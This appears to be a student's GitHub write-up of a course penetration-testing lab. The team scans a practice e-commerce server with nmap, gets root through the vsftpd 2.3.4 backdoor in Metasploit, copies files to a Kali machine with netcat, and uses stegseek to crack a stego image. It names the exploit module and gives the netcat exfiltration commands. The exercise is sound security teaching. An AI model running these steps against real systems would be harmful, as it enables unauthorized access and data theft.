# Network Security Injection Project

In this project I and other team members attacked a server using various security tools and tactics. Through this project, we learned how security breaches occur and how to defend systems and networks.

During this endeavor we used two virtual machines in a VLAN. The first was a Kali box and the second was an ecommerce server. Using Kali, we attacked the server and tested its defense mechanisms. While completing the exercise, we were to assume that the e-commerce server was not visible and therefore we did not attempt to log in.

## Injection Number 1

In injection one we were tasked with creating a security policy and introducing the team to the instructor. The security policy and team introduction we wrote can be found here: https://github.com/TristanJRogers/Network-Security/blob/main/Injection%201.docx 

## Injection Number 2

In injection two the team and I were tasked with the following. 

1. Scan the network to find find the IP address of the e-commerce server
2. Scan the e-commerce server and detect the version of the services that were running

For task 1 the team and I used NMAP to scan the entire subnet. In the picture below you will see a hit for 192.168.1.1 which was most likely a router and a hit for 192.168.1.220. We were able to identify 192.168.1.220 as the e-commerce server due to port 80 and port 3306 being open along with the url given in the scan.

![image](https://github.com/user-attachments/assets/22d9fa04-afaa-47dc-bad0-0d3e0be807d4)

For task 2 we used the command nmap -sV on the e-commerce servers IP to display the version of all services open on the e-commerce server. 

![image](https://github.com/user-attachments/assets/0e3b9e18-2af9-4d05-b8a8-42ea459a58e7)

## Injection Number 3

In injection three the team was tasked with breaking into the server using Metasploit

Using the versions of services running on the e-commerce server, we saw that the FTP service it was running had a backdoor vulnerability. We used the (unix/ftp/vsftpd_234_backdoor) exploit on the e-commerce server and were able to gain a access. 

![image](https://github.com/user-attachments/assets/1c4a3094-ca7b-4c50-9f62-5a347c6a85c9)

Finally, to prove we had root access we used the commands whoami, id, pwd, and ls. See the output below. 

![image](https://github.com/user-attachments/assets/1c4ddbf0-5961-4f41-ba46-b0869da00cff)

## Injection Number 4

In injection number four we were tasked with tasked with transferring three files in from the e-commerce server to our kali machine via Netcat. 

We used the command "nc -v 192.168.1.7 69 <insert file name>" on the ecommerce server and command nc-v -l -p69 > <insert file name> on the kali machine

E-commerce server

![image](https://github.com/user-attachments/assets/28e2c63e-8225-42e2-807c-e403169fb9f2)

Kali machine

![image](https://github.com/user-attachments/assets/d6e0b2df-d472-4d74-ab7b-aa38863df461)

For the final results you will see that in the screenshot below, the files were successfully transferred to our kali machine. 

![image](https://github.com/user-attachments/assets/0585b8fc-a4f7-4c6a-97e5-13a897a44ac0)

## Injection Number 5

In injection number five we were to find a "treasure" within the image file we transferred over to our kali machine. The instructions we were given were located in a file that was encrypted using an RSA algorithm(0x8F6568A3-pub.asc.encrypted.txt).

Here you can see where we unencrypted the file using www.pgptool.org

![image](https://github.com/user-attachments/assets/0c62573f-f7c2-43dc-a9b2-07d3b7db45a2)

As you can see, the instructions indicated that the treasure was hidden using steganography

We tried to use steghide and a password list to find the hidden treasure but it failed. We then began to research and found Stegseek. We then used stegseek with a password list and were finally able to find the hidden treasure: a (fake) credit card number.

![image](https://github.com/user-attachments/assets/a108aa18-a9a1-4a7d-a72d-c8b1f1201d70)

![image](https://github.com/user-attachments/assets/8690dfe1-aac0-4504-9691-3debc9f54f09)

![image](https://github.com/user-attachments/assets/daa6707a-d087-4c55-b918-34b2e3328530)

The full injection five write up can be found here: https://github.com/TristanJRogers/Network-Security--Injections-Project/blob/main/Injection%205.docx 

## Tools/Software Used

www.pgptool.org

Steghide

Stegseek

Metasploit

Netcat

NMAP

Kali Linux

Steganography

RSA Encrption






















